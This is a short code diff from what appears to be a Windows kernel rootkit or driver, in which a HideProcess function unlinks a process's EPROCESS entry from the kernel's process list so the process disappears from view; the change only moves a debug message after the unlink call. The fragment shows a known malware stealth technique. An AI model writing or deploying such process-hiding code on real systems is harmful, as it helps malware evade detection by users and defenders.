@@ -185,8 +185,8 @@ VOID HideProcess(UINT32 PID) {
     while ((ULONG_PTR)StartProcess != (ULONG_PTR)CurrentEPROCESS) {
         // If the current process PID in the loop matches the one we want to hide, we unlink it from the list.
         if (*(UINT32*)CurrentPID == PID) {
-            debug_print("[+] Process is now hidden.\n");
             FlinkBlinkHide(CurrentList);
+            debug_print("[+] Process is now hidden.\n");
             return;
         }
 
